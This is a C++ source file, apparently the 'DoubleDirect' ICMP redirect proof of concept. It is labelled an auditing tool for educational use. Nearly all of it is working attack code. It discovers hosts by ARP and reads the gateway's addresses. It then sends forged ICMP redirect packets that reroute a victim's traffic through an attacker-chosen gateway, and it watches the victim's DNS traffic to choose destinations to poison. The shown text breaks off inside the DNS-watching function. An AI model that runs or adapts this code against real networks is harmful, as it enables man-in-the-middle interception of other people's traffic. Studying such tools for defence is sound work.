/*
 * DoubleDirect - Full-Duplex ICMP Redirect Auditing Tool - doubledirect_poc.cpp
 * Zimperium assumes no responsibility for any damage caused by using this software.
 * Permitted for educational or auditing purposes only.
 * Use at your own risk
 *
 * Author: larry
 */

#include <iostream>
#include <fstream>
#include <string>
#include <map>
#include <vector>
#include <getopt.h>
#include <pthread.h>
#include <crafter.h>

static void printUsage(const std::string& progname) {
    std::cout << "[#] Usage: " << progname << " [options] " << std::endl;
    std::cout << "[#] Options: " << std::endl;
    std::cout << "    -i, --interface    Interface" << std::endl;
    std::cout << "    -g, --new-gateway  New gateway for the poisoned destination" << std::endl;
    std::cout << "    -s, --source       Source IP address of the ICMP message" << std::endl;
    std::cout << "    -v, --victim       Victim IP address" << std::endl;
}

// Local interface info
typedef struct {
    // Broadcast
    struct in_addr bcast;
    // Network Mask
    struct in_addr nmask;
} ifcfg_t;

// Grabs local network interface information and stores in a ifcfg_t
// defined in network.h, returns 0 on success -1 on failure
int get_local_info(const std::string& interface, ifcfg_t *ifcfg) {
    int rsock = socket(PF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface.c_str(), IF_NAMESIZE);
    if((ioctl(rsock, SIOCGIFBRDADDR, &ifr)) == -1){
        perror("ioctl():");
        return -1;
    }
    memcpy(&ifcfg->bcast, &(*(struct sockaddr_in *)&ifr.ifr_broadaddr).sin_addr, 4);

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface.c_str(), IF_NAMESIZE);
    if((ioctl(rsock, SIOCGIFNETMASK, &ifr)) == -1){
        perror("ioctl():");
        return -1;
    }
    memcpy(&ifcfg->nmask.s_addr, &(*(struct sockaddr_in *)&ifr.ifr_netmask).sin_addr, 4);

    close(rsock);
    return 0;
}

std::string get_string_ip(in_addr nip) {
    char str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(nip.s_addr), str, INET_ADDRSTRLEN);
    return std::string(str);
}

std::string get_string_ip(in_addr_t nip) {
    char str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &nip, str, INET_ADDRSTRLEN);
    return std::string(str);
}

// Discover hosts on the local LAN
std::map<std::string, std::string> arp_ping_discover(const std::vector<std::string>& hosts, const std::string& iface) {
    /* Get the IP address associated to the interface */
    std::string MyIP = Crafter::GetMyIP(iface);
    /* Get the MAC Address associated to the interface */
    std::string MyMAC = Crafter::GetMyMAC(iface);

    /* --------- Common data to all headers --------- */

    Crafter::Ethernet ether_header;

    ether_header.SetSourceMAC(MyMAC);
    ether_header.SetDestinationMAC("ff:ff:ff:ff:ff:ff");

    Crafter::ARP arp_header;

    arp_header.SetOperation(Crafter::ARP::Request);
    arp_header.SetSenderIP(MyIP);
    arp_header.SetSenderMAC(MyMAC);

    /* ---------------------------------------------- */

    /* Create a container of packet pointers to hold all the ARP requests */
    std::vector<Crafter::Packet*> request_packets;

    /* Iterate to access each string that defines an IP address */
    for(size_t i = 0 ; i < hosts.size() ; ++i) {

        arp_header.SetTargetIP(hosts[i]);

        /* Create a packet on the heap */
        Crafter::Packet* packet = new Crafter::Packet;

        /* Push the layers */
        packet->PushLayer(ether_header);
        packet->PushLayer(arp_header);

        /* Finally, push the packet into the container */
        request_packets.push_back(packet);
    }

    std::vector<Crafter::Packet*> replies_packets(request_packets.size());

    SendRecv(request_packets.begin(), request_packets.end(), replies_packets.begin(), iface, 0.1, 4, 48);

    std::vector<Crafter::Packet*>::iterator it_pck;
    int counter = 0;
    std::map<std::string, std::string> pair_addr;
    for(it_pck = replies_packets.begin() ; it_pck < replies_packets.end() ; it_pck++) {
        Crafter::Packet* reply_packet = (*it_pck);
        /* Check if the pointer is not NULL */
        if(reply_packet) {
            /* Get the ARP layer of the replied packet */
            Crafter::ARP* arp_layer = reply_packet->GetLayer<Crafter::ARP>();
            /* Print the Source IP */
            std::cout << "[@] Host " << arp_layer->GetSenderIP() << " is up with "
                    "MAC address " << arp_layer->GetSenderMAC() << std::endl;
            pair_addr.insert(std::make_pair(arp_layer->GetSenderIP(), arp_layer->GetSenderMAC()));
            counter++;
        }

    }

    std::cout << "[@] " << counter << " hosts up. " << std::endl;

    /* Delete the container with the ARP requests */
    for(it_pck = request_packets.begin() ; it_pck < request_packets.end() ; it_pck++)
        delete (*it_pck);

    /* Delete the container with the responses  */
    for(it_pck = replies_packets.begin() ; it_pck < replies_packets.end() ; it_pck++)
        delete (*it_pck);
    return pair_addr;
}


// Get gateway MAC
static std::string getGatewayMac(const std::string& iface) {
    // Set default values
    std::string gw_ip("0.0.0.0"), gw_mac("00:00:00:00:00:00");
    char a[16];
    char buf[1024];
    uint32_t b, c, r;
    FILE *route_fd = fopen("/proc/net/route", "r");
    if (route_fd == NULL) return gw_mac;

    fseek(route_fd, 0, 0);
    while (fgets(buf, sizeof(buf), route_fd)) {
        r = sscanf(buf, "%s %x %x", a, &b, &c);
        if ((r == 3) && (strcmp(a, iface.c_str()) == 0) && (b == 0)) {
            struct in_addr in;
            in.s_addr = c;
            gw_ip = std::string(inet_ntoa(in));
            break;
        }
    }

    fclose(route_fd);

    std::string ip_addr_arp;
    std::string hw_addr_arp;
    std::string device_arp;
    std::string dummy;

    std::ifstream arp_table ("/proc/net/arp");
    std::string line;
    std::getline (arp_table,line);

    typedef std::vector<std::pair<std::string, std::string> > addr_pair_cont;
    addr_pair_cont addr_pairs;

    if (arp_table.is_open()) {
        while ( arp_table.good() ) {
            arp_table >> ip_addr_arp;
            arp_table >> dummy;
            arp_table >> dummy;
            arp_table >> hw_addr_arp;
            arp_table >> dummy;
            arp_table >> device_arp;
            // Check if this entry is the gateway
            if(ip_addr_arp == gw_ip) {
                gw_mac = hw_addr_arp;
                break;
            }
        }
    }

    arp_table.close();

    return gw_mac;
}

// Get gateway IP
static std::string getGatewayIp(const std::string& iface) {
    std::string gw_addr("");
    char a[16];
    char buf[1024];
    uint32_t b, c, r;
    FILE *route_fd = fopen("/proc/net/route", "r");
    if (route_fd == NULL) return "";

    fseek(route_fd, 0, 0);
    while (fgets(buf, sizeof(buf), route_fd)) {
        r = sscanf(buf, "%s %x %x", a, &b, &c);
        if ((r == 3) && (strcmp(a, iface.c_str()) == 0) && (b == 0)) {
            struct in_addr in;
            in.s_addr = c;
            gw_addr = std::string(inet_ntoa(in));
            break;
        }
    }

    fclose(route_fd);

    return gw_addr;
}

// Structure to hold parameters of the ICMP redirect attack
struct IcmpRedirParameters {
	// Interface
    std::string _interface;
    // Victim IP address
    std::string _victim;
    // Destination we want to poison
    std::string _destination;
    // Net gateway
    std::string _new_gateway;
    // Source of the ICMP redirect message
    std::string _source_ip;
};

// Attack finished
bool finish = false;

// Global Sniffer pointer
std::vector<Crafter::Sniffer*> sniffers;

// List of poisoned entries (one for each destination)
std::map<std::string, IcmpRedirParameters*> poisoned_entries;
pthread_mutex_t entries_mutex;

// Function for handling a CTRL-C
void ctrl_c(int dummy) {
	// Signal finish of the attack
	finish = true;
	// Cancel the sniffing thread
	for(size_t i = 0 ; i < sniffers.size() ; ++i) {
	    sniffers[i]->Cancel();
	}
}

Crafter::Packet* createIcmpPacket(const IcmpRedirParameters* parameters) {
    // Create an IP header
    Crafter::IP ip_header;
    ip_header.SetSourceIP(parameters->_source_ip);
    ip_header.SetDestinationIP(parameters->_victim);

    // Create an ICMP header
    Crafter::ICMP icmp_header;
    // ICMP redirect message
    icmp_header.SetType(Crafter::ICMP::EchoRedirect);
    // Code for redirect to host
    icmp_header.SetCode(1);
    // Set gateway (put attacker's IP here)
    icmp_header.SetGateway(parameters->_new_gateway);

    // Original packet, this should contain the address we want to poison
    Crafter::IP orig_ip_header;
    orig_ip_header.SetSourceIP(parameters->_victim);
    orig_ip_header.SetDestinationIP(parameters->_destination);

    // Create an UDP header. This could be any protocol (ICMP, UDP, TCP, etc)
    Crafter::UDP orig_udp_header;
    orig_udp_header.SetDstPort(53);
    orig_udp_header.SetSrcPort(Crafter::RNG16());

    // Craft the packet and sent it every 3 seconds
    Crafter::Packet* redir_packet = new Crafter::Packet(ip_header / icmp_header / orig_ip_header / orig_udp_header);

    // Return created packet
    return redir_packet;
}

// Function to send a couple of ICMP redirect messages
void* icmpRedirectAttack(void* arg) {
	// Get attack parameters
	const IcmpRedirParameters* parameters = reinterpret_cast<const IcmpRedirParameters*>(arg);

	// Create packet
	Crafter::Packet* redir_packet = createIcmpPacket(parameters);

	// Send 3 packets
    for(int i = 0 ; i < 3 ; ++i) {
        redir_packet->Send();
        sleep(3);
    }

    return 0;
}

void startIcmpRedirectAttack(IcmpRedirParameters& parameters) {
	pthread_t tid;
	pthread_create(&tid, 0, icmpRedirectAttack, reinterpret_cast<void*>(&parameters));
	pthread_detach(tid);
}

void startIcmpRedirectAttack(IcmpRedirParameters& parameters, const std::string& destination) {
	IcmpRedirParameters* new_parameters = new IcmpRedirParameters(parameters);
	new_parameters->_destination = destination;

	// Save it in global list of poisoned entries
	pthread_mutex_lock(&entries_mutex);
	poisoned_entries.insert(std::make_pair(new_parameters->_victim + ":" + new_parameters->_destination, new_parameters));
	pthread_mutex_unlock(&entries_mutex);

	// Start attack
	startIcmpRedirectAttack(*new_parameters);
}

void DnsWatcher(Crafter::Packet* sniff_packet, void* user) {
	IcmpRedirParameters* parameters = reinterpret_cast<IcmpRedirParameters*>(user);

    /* Get the Ethernet Layer */
    Crafter::Ethernet* ether_layer = GetEthernet(*sniff_packet);

    /* Get the IP layer */
    Crafter::IP* ip_layer = GetIP(*sniff_packet);

    /* Get the UDP layer */
    Crafter::UDP* udp_layer = GetUDP(*sniff_packet);

    /* Checks if the source MAC is not mine */
    if(ether_layer->GetSourceMAC() != getGatewayMac(parameters->_interface)) {

		// Checks if the packet is coming from the server
		if(ip_layer->GetSourceIP() == parameters->_victim) {
			// Get the RawLayer
			Crafter::RawLayer* raw_layer = GetRawLayer(*sniff_packet);

			// Create a DNS header
			Crafter::DNS dns_req;
			// And decode it from a raw layer
			dns_req.FromRaw(*raw_layer);

			// Check if the DNS packet is a query and there is a question on it.
			if( (dns_req.GetQRFlag() == 0) && (dns_req.Queries.size() > 0) ) {
					// Get the host name to be resolved
					std::string hostname = dns_req.Queries[0].GetName();
					// Print information
					std::cout << "[@] Query detected -> Host Name = " << hostname << std::endl;
			}

		// ...or coming from the server (better)
		} else if (ip_layer->GetDestinationIP() == parameters->_victim) {

			// Get the RawLayer
			Crafter::RawLayer* raw_layer = GetRawLayer(*sniff_packet);

			// Create a DNS header
			Crafter::DNS dns_res;
			// And decode it from a raw layer
			dns_res.FromRaw(*raw_layer);

			// Check if we have responses on the DNS packet.
			if(dns_res.Answers.size() > 0) {
				for(size_t i = 0 ; i < dns_res.Answers.size() ; ++i) {
					if(dns_res.Answers[i].GetType() == Crafter::DNS::TypeA) {
						// Get the host name to be resolved
						std::string ip = dns_res.Answers[i].GetRData();
						// Print information
						std::cout << "[@] Response detected -> IP add
